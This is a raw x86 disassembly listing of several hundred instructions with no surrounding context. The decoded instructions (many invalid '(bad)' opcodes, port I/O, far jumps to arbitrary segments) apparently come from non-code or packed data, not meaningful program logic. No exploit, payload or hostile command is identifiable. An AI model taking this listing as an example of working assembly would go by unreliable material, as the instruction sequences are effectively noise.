  417bb7:	mov    ebp,0xe59f86ad
  417bbc:	retf   
  417bbd:	push   ebp
  417bbe:	aas    
  417bbf:	out    dx,al
  417bc0:	sub    al,0x43
  417bc2:	repz xchg ecx,eax
  417bc4:	ins    BYTE PTR es:[edi],dx
  417bc5:	cmp    ch,BYTE PTR [edi]
  417bc7:	mov    ebx,DWORD PTR [edx+0x2c30fa3]
  417bcd:	(bad)  
  417bce:	in     al,0x55
  417bd0:	in     al,0x55
  417bd2:	ins    BYTE PTR es:[edi],dx
  417bd3:	call   0x5fab172e
  417bd8:	rol    BYTE PTR [ebx],0x9d
  417bdb:	gs mov ch,0xe5
  417bde:	or     al,0x73
  417be0:	adc    al,0xfe
  417be2:	mov    ds:0x28579ed,al
  417be7:	xor    eax,0x8f45ab3
  417bec:	jae    0x417c1b
  417bee:	mov    al,0x25
  417bf0:	mov    esp,0x5b35d8aa
  417bf5:	pop    ss
  417bf6:	xor    al,0xb0
  417bf8:	outs   dx,BYTE PTR ds:[esi]
  417bf9:	jb     0x417b89
  417bfb:	cdq    
  417bfc:	cmp    BYTE PTR [ecx-0x7f],ah
  417bff:	dec    ebx
  417c00:	sbb    BYTE PTR [edi],dh
  417c02:	jmp    0x612d1e7
  417c07:	inc    edi
  417c08:	inc    ebp
  417c09:	sub    edi,DWORD PTR [ebx+0x59]
  417c0c:	add    dl,BYTE PTR [ebx]
  417c0e:	loope  0x417c3d
  417c10:	sub    BYTE PTR [edi-0x1b],al
  417c13:	pop    DWORD PTR [ebp+ebx*8+0x47368bbb]
  417c1a:	push   cs
  417c1b:	fwait
  417c1c:	adc    eax,0x84de0766
  417c21:	not    esi
  417c23:	out    0x3b,al
  417c25:	and    ecx,esi
  417c27:	pop    edx
  417c28:	repnz push esp
  417c2a:	fild   QWORD PTR [ecx+eiz*2-0x1a1f9cce]
  417c31:	adc    eax,0x919f5c
  417c36:	push   esp
  417c37:	outs   dx,BYTE PTR ds:[esi]
  417c38:	pop    esp
  417c39:	ins    DWORD PTR es:[edi],dx
  417c3a:	pop    ebp
  417c3b:	je     0x417c9a
  417c3d:	jmp    DWORD PTR [edi-0x8b2ba1a]
  417c43:	adc    eax,0x364ccaeb
  417c48:	xor    dh,BYTE PTR [ebx+0x1191587c]
  417c4e:	(bad)  [edx+0x45]
  417c51:	add    ch,bl
  417c53:	lods   eax,DWORD PTR ds:[esi]
  417c54:	jl     0x417c54
  417c56:	and    DWORD PTR [edi+0x2e],edx
  417c59:	outs   dx,DWORD PTR ds:[esi]
  417c5a:	pop    eax
  417c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c5c:	hlt    
  417c5d:	push   0x6c
  417c5f:	imul   ebx,DWORD PTR [edx],0x24
  417c62:	fld    TBYTE PTR [eax+ebx*1]
  417c65:	jge    0x417c30
  417c67:	sub    BYTE PTR [esi+ecx*4-0x62],bh
  417c6b:	adc    eax,0x66ad648d
  417c70:	add    DWORD PTR [eax],0x8c521028
  417c76:	loop   0x417cf5
  417c78:	int    0x1c
  417c7a:	ret    
  417c7b:	int3   
  417c7c:	and    al,0xd0
  417c7e:	xchg   esi,eax
  417c7f:	xor    DWORD PTR [ebp-0x21eda6f0],ebp
  417c85:	pop    eax
  417c86:	fisttp DWORD PTR [eax]
  417c88:	cmp    al,0x4c
  417c8a:	lea    ebp,ds:0x2e681082
  417c90:	jae    0x417ce0
  417c92:	hlt    
  417c93:	fsubr  DWORD PTR [edi+0x6b88df5c]
  417c99:	out    0xbb,eax
  417c9b:	data16 fisttp DWORD PTR [edx-0x64147f6d]
  417ca2:	mov    BYTE PTR [edi+0x23075c67],al
  417ca8:	mov    dh,0x3a
  417caa:	dec    esi
  417cab:	lea    eax,[ecx-0x49f14292]
  417cb1:	ins    BYTE PTR es:[edi],dx
  417cb2:	loope  0x417cd2
  417cb4:	sbb    BYTE PTR [edi],dh
  417cb6:	cli    
  417cb7:	sbb    cl,BYTE PTR [ebp+0x49]
  417cba:	sbb    cl,BYTE PTR [esi+edx*4+0x65]
  417cbe:	adc    eax,0xe8e97cc
  417cc3:	sub    al,BYTE PTR [ebx+0x39538a84]
  417cc9:	(bad)  
  417ccb:	and    ch,al
  417ccd:	(bad)  
  417cce:	cli    
  417ccf:	(bad)  
  417cd1:	ret    0x403a
  417cd4:	mov    WORD PTR [ebx+esi*8],cs
  417cd7:	cmp    cl,al
  417cd9:	bnd jae 0x417c64
  417cdc:	xor    esi,DWORD PTR [edx]
  417cde:	nop
  417cdf:	jae    0x417c62
  417ce1:	popa   
  417ce2:	pop    esp
  417ce3:	fisub  DWORD PTR [edi-0x56]
  417ce6:	rcl    BYTE PTR [ecx-0x7151f585],0x65
  417ced:	rcr    BYTE PTR [eax+edi*1],cl
  417cf0:	sbb    ah,BYTE PTR ds:0x90944ce1
  417cf6:	pop    ecx
  417cf7:	imul   ebp,DWORD PTR [edi+0x6d],0xb8fd6402
  417cfe:	mov    edi,0xad664ae3
  417d03:	dec    ebx
  417d04:	sub    bl,BYTE PTR [ebx-0x50f083b8]
  417d0a:	mov    edx,0xc3ea4236
  417d0f:	cmp    esi,ecx
  417d11:	stos   BYTE PTR es:[edi],al
  417d12:	cmc    
  417d13:	ins    BYTE PTR es:[edi],dx
  417d14:	daa    
  417d15:	mov    ebp,edi
  417d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d18:	outs   dx,DWORD PTR ds:[esi]
  417d19:	outs   dx,BYTE PTR ds:[esi]
  417d1a:	aas    
  417d1b:	fstp   st(0)
  417d1d:	push   esi
  417d1e:	out    0xd1,al
  417d20:	push   ds
  417d21:	mov    edi,0x82d69d92
  417d26:	dec    edx
  417d27:	(bad)  
  417d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d29:	cmp    al,0x6f
  417d2b:	mov    dh,0xa3
  417d2d:	push   0x97331342
  417d32:	addr16 xor eax,0x4bb5a096
  417d38:	es add al,0x3
  417d3b:	cmp    DWORD PTR [edi+0x41],edx
  417d3e:	fucomip st,st(1)
  417d40:	pop    es
  417d41:	popf   
  417d42:	test   DWORD PTR [esp+ebp*4-0x4b],edi
  417d46:	nop
  417d47:	mov    al,0x3
  417d49:	or     bh,ah
  417d4b:	or     eax,0xd24a0d3
  417d50:	data16 test ah,cl
  417d53:	jmp    0x417da1
  417d55:	or     BYTE PTR [ebp-0x7c],dh
  417d58:	or     edx,DWORD PTR [ebp-0x29]
  417d5b:	mov    cl,0xd0
  417d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d5e:	or     al,0xec
  417d60:	int    0x7a
  417d62:	sbb    cl,BYTE PTR [esi]
  417d64:	out    0xf2,al
  417d66:	loope  0x417d42
  417d68:	or     al,BYTE PTR [ebx]
  417d6a:	cld    
  417d6b:	(bad)  
  417d6c:	push   0xc4ef6adb
  417d71:	cwde   
  417d72:	jno    0x417d53
  417d74:	add    al,BYTE PTR [ebx+0x7c929518]
  417d7a:	aad    0x58
  417d7c:	iret   
  417d7d:	jmp    0x2aa3e8cc
  417d82:	push   edx
  417d83:	pop    es
  417d84:	xchg   edi,eax
  417d85:	sub    eax,0xcd1297c3
  417d8a:	out    dx,al
  417d8b:	push   cs
  417d8c:	daa    
  417d8d:	fisubr WORD PTR [ebp-0x3]
  417d90:	xor    esp,DWORD PTR [esi+eax*4-0x1d]
  417d94:	sahf   
  417d95:	les    ecx,FWORD PTR [esi+0xddf478b]
  417d9b:	fld    TBYTE PTR [edi+ecx*2]
  417d9e:	cwde   
  417d9f:	loop   0x417de8
  417da1:	xor    esp,edi
  417da3:	jbe    0x417da5
  417da5:	jp     0x417d9b
  417da7:	hlt    
  417da8:	inc    ebp
  417da9:	jb     0x417d60
  417dab:	mov    DWORD PTR [edi+0x5c3401e8],esi
  417db1:	mov    al,ds:0x8aa112b
  417db6:	fs aad 0xa2
  417db9:	ror    DWORD PTR [ecx-0x22310e6a],cl
  417dbf:	or     dl,al
  417dc1:	add    eax,0x81957400
  417dc6:	mov    ch,ch
  417dc8:	inc    eax
  417dc9:	hlt    
  417dca:	jmp    0x1fdecb36
  417dcf:	jmp    0xc79d:0x33953fc8
  417dd6:	mov    eax,ds:0xc6f7dc4f
  417ddb:	out    0x16,eax
  417ddd:	add    eax,0x30844251
  417de2:	out    dx,eax
  417de3:	push   ebx
  417de5:	dec    ebp
  417de6:	sar    DWORD PTR [esi+0x38],cl
  417de9:	mov    esi,0xe9b4134f
  417dee:	mov    DWORD PTR [eax+0x66],esp
  417df1:	jb     0x417e46
  417df3:	daa    
  417df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417df5:	cmp    DWORD PTR [edi-0x291d9451],ebp
  417dfb:	fdiv   st,st(3)
  417dfd:	and    DWORD PTR [esi-0x44],0xe54b7a38
  417e04:	(bad)  
  417e05:	mov    ebp,ebx
  417e07:	xor    eax,0x9955e656
  417e0c:	mul    BYTE PTR [ebp-0x7b0d3763]
  417e12:	push   ss
  417e13:	sub    BYTE PTR [esp+esi*1+0x2d],dh
  417e17:	pusha  
  417e18:	push   eax
  417e19:	pop    ecx
  417e1a:	inc    esi
  417e1b:	(bad)  
  417e1c:	and    DWORD PTR [ebx-0xa],ecx
  417e1f:	ja     0x417e27
  417e21:	stos   DWORD PTR es:[edi],eax
  417e22:	dec    edx
  417e23:	test   DWORD PTR [ecx+0x1d7a5088],0x621fcfaf
  417e2d:	inc    ebp
  417e2e:	xchg   esp,eax
  417e2f:	fsubr  QWORD PTR [eax]
  417e31:	nop
  417e32:	sub    ebx,0xd992dd71
  417e38:	sbb    al,0xcb
  417e3a:	lahf   
  417e3b:	jecxz  0x417e80
  417e3d:	ret    
  417e3e:	icebp  
  417e3f:	lods   al,BYTE PTR ds:[esi]
  417e40:	pmullw mm3,mm3
  417e43:	ins    DWORD PTR es:[edi],dx
  417e44:	xchg   BYTE PTR [esi-0xa79da67],dh
  417e4a:	mov    WORD PTR [esi],ss
  417e4c:	scas   eax,DWORD PTR es:[edi]
  417e4d:	inc    ebx
  417e4e:	sahf   
  417e4f:	ret    0xbff1
  417e52:	aas    
  417e53:	push   edx
  417e54:	cld    
  417e55:	jb     0x417e18
  417e57:	push   esp
  417e58:	outs   dx,BYTE PTR ds:[esi]
  417e59:	idiv   DWORD PTR [edx-0x1d]
  417e5c:	stos   BYTE PTR es:[edi],al
  417e5d:	mov    dl,0x76
  417e5f:	imul   eax,DWORD PTR [eax+ebx*1-0x2d],0xffffffab
  417e64:	push   esi
  417e65:	jecxz  0x417e34
  417e67:	call   0xacba:0xce0ad89d
  417e6e:	push   cs
  417e6f:	(bad)  
  417e70:	repnz sbb BYTE PTR [edx],bl
  417e73:	in     al,dx
  417e74:	jmp    0x417eed
  417e76:	dec    esi
  417e77:	mov    dh,0xde
  417e79:	sbb    al,0xfc
  417e7b:	xor    DWORD PTR [edx-0x5207e0f2],esi
  417e81:	call   0xbc62:0x384f8b62
  417e88:	or     DWORD PTR [ecx-0x4227a13f],ebx
  417e8e:	lahf   
  417e8f:	stos   DWORD PTR es:[edi],eax
  417e90:	xlat   BYTE PTR ds:[ebx]
  417e91:	mov    ch,0xa7
  417e93:	xor    eax,0x337bef8f
  417e98:	pop    esp
  417e99:	push   es
  417e9a:	push   ds
  417e9b:	sbb    eax,0xf0ef8437
  417ea0:	and    dh,dh
  417ea2:	popf   
  417ea3:	cmc    
  417ea4:	mov    ecx,0x1fb81bd6
  417ea9:	lods   eax,DWORD PTR ds:[esi]
  417eaa:	mov    edx,0x4d99019e
  417eaf:	out    0x3f,eax
  417eb1:	mov    bl,0x2
  417eb3:	enter  0x4966,0x2f
  417eb7:	inc    ebp
  417eb8:	or     al,BYTE PTR [esi+esi*2+0x59]
  417ebc:	ret    
  417ebd:	shl    BYTE PTR [ebx-0x7a],1
  417ec0:	mov    ah,0x36
  417ec2:	xchg   DWORD PTR [edi+0x6],esp
  417ec5:	lds    esp,FWORD PTR [ebp-0x3a]
  417ec8:	pop    edx
  417ec9:	hlt    
  417eca:	push   esp
  417ecb:	mov    cs,WORD PTR [edx-0x7d]
  417ece:	cwde   
  417ecf:	push   esp
  417ed0:	popf   
  417ed1:	repz jg 0x417e93
  417ed4:	test   BYTE PTR [esi+0x4b],al
  417ed7:	cmp    eax,0x11bdcd3f
  417edc:	mov    ds:0xb3c948de,eax
  417ee1:	(bad)  
  417ee3:	add    DWORD PTR [eax],esp
  417ee5:	fs loop 0x417ecf
  417ee8:	sub    BYTE PTR [esi+0x5091e5ce],0xc7
  417eef:	sti    
  417ef0:	pop    ss
  417ef1:	addr16 push 0x75
  417ef4:	fwait
  417ef5:	pop    ss
  417ef6:	or     DWORD PTR [edx-0xa],esi
  417ef9:	inc    esp
  417efa:	lahf   
  417efb:	push   ds
  417efc:	cmp    ecx,esi
  417efe:	or     BYTE PTR [edi+0x20381387],0xe5
  417f05:	pop    ecx
  417f06:	and    eax,0x1d8cf4f2
  417f0b:	aad    0xe7
  417f0d:	lods   eax,DWORD PTR ds:[esi]
  417f0e:	xchg   ecx,eax
  417f0f:	or     al,0x9a
  417f11:	jl     0x417f61
  417f13:	(bad)
  417f16:	jge    0x417eeb
  417f18:	inc    esp
  417f19:	cmc    
  417f1a:	ss push edx
  417f1c:	adc    al,0x74
  417f1e:	push   gs
  417f20:	pop    ebp
  417f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f22:	jmp    0x74a3:0x58846c40
  417f29:	add    cl,BYTE PTR [ebx]
  417f2b:	(bad)  
  417f2c:	jbe    0x417f7e
  417f2e:	or     ebx,DWORD PTR [ecx-0x6d6e1369]
  417f34:	rcl    BYTE PTR [ebx+esi*1],1
  417f37:	sbb    DWORD PTR [edx-0x72be67e2],esp
  417f3d:	jns    0x417efe
  417f3f:	clc    
  417f40:	out    dx,al
  417f41:	(bad)  
  417f42:	jmp    0x417f9e
  417f44:	daa    
  417f45:	push   es
  417f46:	fist   DWORD PTR [ecx+0x22ee126d]
  417f4c:	sbb    dl,dl
  417f4e:	icebp  
  417f4f:	and    cl,BYTE PTR [ecx-0x64]
  417f52:	enter  0xef6d,0x6b
  417f56:	or     al,0xda
  417f58:	or     dl,BYTE PTR [edi-0x7e]
  417f5b:	popa   
  417f5c:	shl    bh,cl
  417f5e:	pop    ss
  417f5f:	ins    BYTE PTR es:[edi],dx
  417f60:	sbb    al,0xf7
  417f62:	sbb    ebp,DWORD PTR [ecx-0x6d89df9f]
  417f68:	ret    
  417f69:	sub    dl,bh
  417f6b:	shr    DWORD PTR [edx+ebx*1-0x15],cl
  417f6f:	inc    edx
  417f70:	ss sti 
  417f72:	xor    al,0x34
  417f74:	xchg   edi,eax
  417f75:	sub    BYTE PTR [esi-0x2],bh
  417f78:	(bad)  
  417f79:	ins    BYTE PTR es:[edi],dx
  417f7a:	sub    edx,DWORD PTR [ebp-0x30]
  417f7d:	cmp    ebx,DWORD PTR [ebx-0x4c]
  417f80:	clc    
  417f81:	and    al,0xb2
  417f83:	xchg   ebp,eax
  417f84:	sbb    bh,BYTE PTR [edi]
  417f86:	and    bh,0x51
  417f89:	mov    edi,0xea7dfe5d
  417f8e:	sub    al,0xb4
  417f90:	cmp    esi,DWORD PTR [ebx+0x22a79da2]
  417f96:	shr    DWORD PTR [esi+edx*1-0x46156f80],0xe3
  417f9e:	xchg   esp,eax
  417f9f:	lods   al,BYTE PTR ds:[esi]
  417fa0:	das    
  417fa1:	inc    edx
  417fa2:	enter  0xa33b,0x3a
  417fa6:	pop    esp
  417fa7:	inc    ebp
  417fa8:	sub    al,0x4e
  417faa:	test   al,0x62
  417fac:	std    
  417fad:	adc    ecx,DWORD PTR [ecx*2+0x66350e7b]
  417fb4:	jmp    0x1cf41be4
  417fb9:	daa    
  417fba:	jnp    0x418022
  417fbc:	outs   dx,BYTE PTR ds:[esi]
  417fbd:	inc    DWORD PTR [eax-0x3a]
  417fc0:	add    eax,0xc83bc2e
  417fc5:	shl    DWORD PTR [esp+edx*2-0x2],0x10
  417fca:	int    0x78
  417fcc:	pop    esp
  417fcd:	dec    eax
  417fce:	adc    eax,0xf16f426c
  417fd3:	dec    ecx
  417fd4:	(bad)  
  417fd5:	clc    
  417fd6:	adc    DWORD PTR [esi-0x76193c5d],ecx
  417fdc:	push   ds
  417fdd:	pop    ss
  417fde:	xchg   BYTE PTR [eax+0x70],al
  417fe1:	(bad)
  417fe4:	ins    DWORD PTR es:[edi],dx
  417fe5:	in     eax,dx
  417fe6:	cmp    al,0x22
  417fe8:	inc    eax
  417fe9:	xchg   ecx,eax
  417fea:	add    eax,esi
  417fec:	add    ch,dh
  417fee:	sbb    al,0x6
  417ff0:	jbe    0x418023
  417ff2:	sub    al,0xa0
  417ff4:	fs mov edx,0xd8273380
  417ffa:	dec    ecx
  417ffb:	dec    esp
  417ffc:	mul    BYTE PTR [edx-0x6f]
  417fff:	jb     0x418015
  418001:	pop    edx
  418002:	outs   dx,BYTE PTR ds:[esi]
  418003:	xlat   BYTE PTR ds:[ebx]
  418004:	cld    
  418005:	lock std 
  418007:	aaa    
  418008:	(bad)  
  41800b:	xchg   esp,eax
  41800c:	bound  ebp,QWORD PTR [ebx]
  41800e:	inc    edx
  41800f:	inc    ebx
  418010:	sar    BYTE PTR ds:0xa67d34aa,cl
  418016:	rcr    BYTE PTR [esp+ecx*1-0x619084f2],1
  41801d:	xchg   edi,eax
  41801e:	dec    eax
  41801f:	cld    
  418020:	icebp  
  418021:	sbb    eax,0x686f35c8
  418026:	jp     0x417fe5
  418028:	cmp    esi,esi
  41802a:	xchg   ecx,eax
  41802b:	push   es
  41802c:	fstp   QWORD PTR [ecx-0x45]
  41802f:	sbb    eax,0x17f9be81
  418034:	stos   DWORD PTR es:[edi],eax
  418035:	sub    ecx,DWORD PTR [ecx-0x813fad8]
  41803b:	sti    
  41803c:	mov    edx,0xc254254a
  418041:	scas   al,BYTE PTR es:[edi]
  418042:	retf   
  418043:	sahf   
  418044:	aam    0xe7
  418046:	neg    BYTE PTR [edi-0x138a9a36]
  41804c:	cmp    DWORD PTR [ecx+ebx*1],0x75
  418050:	cld    
  418051:	and    eax,eax
  418053:	rcr    eax,cl
  418055:	pop    es
  418056:	xor    esp,ebp
  418058:	xchg   ebp,eax
  418059:	inc    esi
  41805a:	call   0x74b6:0xca4107a4
  418061:	sub    BYTE PTR [eax+0x78196fa7],ch
  418067:	jp     0x4180df
  418069:	adc    al,0x6c
  41806b:	nop
  41806c:	dec    edi
  41806d:	dec    ebx
  41806e:	mov    bl,0x21
  418070:	or     eax,0x25d21531
  418075:	jno    0x418062
  418077:	cmp    BYTE PTR [esi+0x34674013],bh
  41807d:	lods   al,BYTE PTR ds:[esi]
  41807e:	sub    bh,BYTE PTR [ebx-0x1]
  418081:	repnz xchg ebp,eax
  418083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418084:	mov    bl,0xd5
  418086:	mov    bh,0x1
  418088:	fwait
  418089:	test   al,0xcd
  41808b:	pop    edi
  41808c:	push   cs
  41808d:	xlat   BYTE PTR ds:[ebx]
  41808e:	or     al,BYTE PTR [ebp+0x7fd4136f]
  418094:	xor    ah,bh
  418096:	inc    esi
  418097:	repnz inc eax
  418099:	sahf   
  41809a:	jmp    0x418064
  41809c:	adc    ah,BYTE PTR [edi-0x546f5b32]
  4180a2:	jge    0x418074
  4180a4:	pop    ss
  4180a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180a6:	pop    edx
  4180a7:	adc    eax,0x3dd8d720
  4180ac:	cs mov edx,ebp
  4180af:	xchg   ebp,eax
  4180b0:	int3   
  4180b1:	scas   eax,DWORD PTR es:[edi]
  4180b2:	cwde   
  4180b3:	adc    ebp,DWORD PTR [eax+edi*8]
  4180b6:	ret    0xfc0a
  4180b9:	lahf   
  4180ba:	or     DWORD PTR [ecx+0x778bf74b],edi
  4180c0:	popa   
  4180c1:	add    ch,0x1
  4180c4:	jp     0x41804b
  4180c6:	adc    BYTE PTR [edi-0x2c],dl
  4180c9:	cmp    bh,BYTE PTR [eax-0x2f6ad477]
  4180cf:	dec    ecx
  4180d0:	call   0xd3b8edfb
  4180d5:	idiv   BYTE PTR [edi+0x529a5319]
  4180db:	mov    bh,0xf
  4180dd:	and    al,0x6d
  4180df:	pop    esi
  4180e0:	mov    DWORD PTR [eax-0x4],esi
  4180e3:	daa    
  4180e4:	cmp    edi,edi
  4180e6:	ret    
  4180e7:	cld    
  4180e8:	or     BYTE PTR [ecx],0x88
  4180eb:	outs   dx,BYTE PTR ds:[si]
  4180ed:	adc    BYTE PTR ds:0x8466661d,al
  4180f3:	xchg   DWORD PTR [esi],esi
  4180f5:	lds    ebp,FWORD PTR [ecx-0x33b320e4]
  4180fb:	mov    esi,0xad310b7c
  418100:	cli    
  418101:	imul   ecx,ecx,0x1aa4a4dd
  418107:	mov    es,WORD PTR [ebp-0x1fc1d931]
  41810d:	into   
  41810e:	jne    0x4180e8
  418110:	cmc    
  418111:	sbb    esp,DWORD PTR [ebx+0x5a]
  418114:	adc    esi,esi
  418116:	pop    ds
  418117:	mov    eax,0x104be7a3
  41811c:	fdivp  st(0),st
  41811e:	outs   dx,BYTE PTR ds:[esi]
  41811f:	xchg   edx,eax
  418120:	dec    esi
  418121:	mov    esi,0xf431d71d
  418126:	mov    ebx,0x2fd78e09
  41812b:	lahf   
  41812c:	push   cs
  41812d:	pop    ecx
  41812e:	mov    esi,0x8b0e0a74
  418133:	sbb    eax,0x846ea49e
  418138:	pop    ds
  418139:	imul   ecx,DWORD PTR [ebx],0x23
  41813c:	dec    edi
  41813d:	pop    es
  41813e:	lock sbb edx,DWORD PTR [edi+ebx*4-0x7aa4032f]
  418146:	(bad)  
  418147:	(bad)  
  418148:	scas   eax,DWORD PTR es:[edi]
  418149:	sbb    al,0x80
  41814b:	iret   
  41814c:	call   0xdb659198
  418151:	xchg   edi,eax
  418152:	in     al,0x45
  418154:	test   eax,0xb0f6bb65
  418159:	outs   dx,BYTE PTR ds:[esi]
  41815a:	adc    esp,0x4a
  41815d:	popa   
  41815e:	push   esp
  41815f:	stos   DWORD PTR es:[edi],eax
  418160:	sub    ebx,eax
  418162:	pop    ecx
  418163:	or     al,0x75
  418165:	bound  edx,QWORD PTR [edx+0x49]
  418168:	pop    edi
  418169:	mov    eax,ecx
  41816b:	mov    esi,0x220991c2
  418170:	repnz xor DWORD PTR [eax-0x33],ebp
  418174:	(bad)  
  418175:	mov    ecx,0x23ae8a52
  41817a:	add    DWORD PTR [ecx-0x761eff4a],0xffffff9d
  418181:	jb     0x418162
  418183:	pop    esp
  418184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418185:	in     al,dx
  418186:	aas    
  418187:	iret   
  418188:	mov    eax,0xdf4ad977
  41818d:	pop    ecx
  41818e:	adc    esi,DWORD PTR [ecx+0x47bba8e0]
  418194:	adc    ebx,DWORD PTR [esi]
  418196:	push   eax
  418197:	mov    al,0x96
  418199:	adc    BYTE PTR [eax+eax*4+0x74952330],bl
  4181a0:	aam    0xc2
  4181a2:	loop   0x41819a
  4181a4:	cmc    
  4181a5:	ficom  DWORD PTR [ebx-0x3d]
  4181a8:	jns    0x4181fa
  4181aa:	or     bl,BYTE PTR [ebp-0x5d87e43d]
  4181b0:	xchg   edx,eax
  4181b1:	das    
  4181b2:	pop    es
  4181b3:	xchg   DWORD PTR [ebp+0x40],ecx
  4181b6:	cli    
  4181b7:	ret    0x3fbf
  4181ba:	shr    BYTE PTR [esi-0x52],0xf3
  4181be:	jmp    0x5344:0x6c78fae3
  4181c5:	aas    
  4181c6:	lds    esi,FWORD PTR [ebp+0x6253557d]
  4181cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181cd:	jo     0x41823f
  4181cf:	jo     0x418240
  4181d1:	pop    esi
  4181d2:	jo     0x4181d5
  4181d4:	or     al,0xe8
  4181d6:	lahf   
  4181d7:	data16 or BYTE PTR [ebx+0x26],dh
  4181db:	mov    al,ds:0xab6b9336
  4181e0:	cmp    BYTE PTR [ebx+0xba9ce88],cl
  4181e6:	xor    BYTE PTR [eax],dh
  4181e8:	dec    esp
  4181e9:	out    0x38,eax
  4181eb:	test   BYTE PTR [eax-0x69ce04ff],al
  4181f1:	mov    dl,0x2
  4181f3:	out    0xc5,al
  4181f5:	xor    al,0x6
  4181f7:	xchg   dh,dh
  4181f9:	imul   esi,DWORD PTR [edi-0x12855680],0xffffffb1
  418200:	add    ah,BYTE PTR [esi-0x7a0a9431]
  418206:	xchg   ecx,eax
  418207:	repnz fstp QWORD PTR [ebx+edx*2+0x47cba056]
  41820f:	sub    ecx,DWORD PTR [ebp-0x29a60662]
  418215:	popa   
  418216:	sub    DWORD PTR [edx+eiz*1-0x7d1607c4],eax
  41821d:	dec    ebp
  41821e:	bound  esp,QWORD PTR [eax]
  418220:	ror    BYTE PTR ds:0xd2eceddc,1
  418226:	fs ins DWORD PTR es:[edi],dx
  418228:	mov    ds:0x44b5d979,al
  41822d:	outs   dx,BYTE PTR gs:[esi]
  41822f:	out    dx,al
  418230:	push   ss
  418231:	fadd   DWORD PTR [esi+0xd]
  418234:	test   ch,0x3d
  418237:	jg     0x418222
  418239:	jmp    0x707c:0xaf75061d
  418240:	repnz ss add al,0x15
  418244:	popa   
  418245:	imul   DWORD PTR [edx]
  418247:	call   0x831f:0x7e0cc573
  41824e:	fyl2xp1 
  418250:	add    eax,ebx
  418252:	mov    esi,0xa199fe3f
  418257:	and    esp,DWORD PTR [si-0x1c]
  41825b:	es jne 0x418280
  41825e:	loope  0x418229
  418260:	loop   0x4181ed
  418262:	lahf   
  418263:	mov    dh,0x9a
  418265:	jbe    0x41820e
  418267:	xchg   edx,eax
  418268:	adc    eax,0xbf503a63
  41826d:	pop    ss
  41826e:	jl     0x4182bd
  418270:	add    ecx,esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	pop    edi
  418275:	mov    al,0x55
  418277:	jmp    0x418297
  418279:	popf   
  41827a:	loopne 0x418240
  41827c:	jo     0x418255
  41827e:	mov    edi,0xdf1c227a
  418283:	mov    ds:0x4d976fdc,eax
  418288:	push   eax
  418289:	cld    
  41828a:	call   0x72ae:0x1815aa93
  418291:	inc    ecx
  418292:	lock jne 0x418305
  418295:	or     eax,0x62f19d74
  41829a:	nop
  41829b:	and    si,sp
  41829e:	jno    0x418302
  4182a0:	ficomp WORD PTR [eax-0x7b580a5b]
  4182a6:	add    DWORD PTR ss:[edi+esi*1-0x42],eax
  4182ab:	mov    edx,0x1b1dee75
  4182b0:	dec    eax
  4182b1:	imul   esp,DWORD PTR [ecx-0x72],0xc7c30cf2
  4182b8:	enter  0x9727,0xe0
  4182bc:	repnz push 0xffffffa6
  4182bf:	push   0xe15ad2b3
  4182c4:	and    al,0x1f
  4182c6:	cwde   
  4182c7:	jl     0x4182a5
  4182c9:	in     al,dx
  4182ca:	daa    
  4182cb:	xchg   edx,eax
  4182cc:	pop    esp
  4182cd:	sub    ebx,esp
  4182cf:	xchg   edx,eax
  4182d0:	xchg   esi,eax
  4182d1:	(bad)  
  4182d2:	jmp    0x4308:0x95442adb
  4182d9:	dec    esp
  4182da:	loopne 0x4182e3
  4182dc:	lds    ebx,FWORD PTR [edi+0x14]
  4182df:	xchg   edx,eax
  4182e0:	xchg   ebp,eax
  4182e1:	sbb    DWORD PTR [ebx],esp
  4182e3:	cmp    ah,ah
  4182e5:	scas   eax,DWORD PTR es:[edi]
  4182e6:	(bad)  
  4182e8:	cmp    ah,BYTE PTR [eax-0x6744b227]
  4182ee:	int3   
  4182ef:	inc    edi
  4182f0:	inc    edx
  4182f1:	mov    ah,0x55
  4182f3:	mov    edi,0x954250c6
  4182f8:	aas    
  4182f9:	xchg   edi,eax
  4182fa:	mov    ah,0xd3
  4182fc:	div    BYTE PTR [edx]
  4182fe:	retf   0x4d9
  418301:	dec    ebx
  418302:	jbe    0x41837b
  418304:	call   0xa4d3:0x1fd86331
  41830b:	(bad)  
  41830c:	sti    
  41830d:	cmp    BYTE PTR [edx-0x7d05d023],dl
  418313:	mov    eax,0x465e56ff
  418318:	xchg   ebx,eax
  418319:	dec    eax
  41831a:	ins    DWORD PTR es:[edi],dx
  41831b:	xor    eax,0x9fb842b4
  418320:	mov    al,BYTE PTR [edi]
  418322:	aad    0x66
  418324:	or     al,dl
  418326:	out    dx,al
  418327:	js     0x418327
  418329:	sub    al,0xc
  41832b:	loopne 0x418372
  41832d:	sub    esp,DWORD PTR [ebp-0x2d]
  418330:	jmp    FWORD PTR [edx+0x21]
  418333:	push   eax
  418334:	push   ds
  418335:	idiv   DWORD PTR [edx+ebp*4+0x4c04befc]
  41833c:	fld    TBYTE PTR [ebx-0x52]
  41833f:	fisub  DWORD PTR [edx-0x31840a4f]
  418345:	rcr    BYTE PTR [edi-0x59],cl
  418348:	mulps  xmm7,xmm7
  41834b:	rcr    DWORD PTR [edx],cl
  41834d:	xchg   edi,eax
  41834e:	ds xor eax,0x976b9276
  418354:	or     edi,DWORD PTR [ebx-0x54]
  418357:	push   ss
  418358:	ss mov edx,0xbee7e81d
  41835e:	js     0x418371
  418360:	icebp  
  418361:	aas    
  418362:	sar    DWORD PTR [ecx],cl
  418364:	fst    DWORD PTR [esi-0x16]
  418367:	sub    al,0xca
  418369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41836a:	xor    dl,dh
  41836c:	xor    ch,BYTE PTR [ebx-0x2e4e43f0]
  418372:	test   eax,0xcb315f61
  418377:	shl    bh,1
  418379:	out    0xd5,eax
  41837b:	jne    0x418332
  41837d:	mov    ds:0xfd873400,al
  418382:	mov    ah,0x66
  418384:	in     al,0x24
  418386:	xor    ecx,eax
  418388:	push   ebp
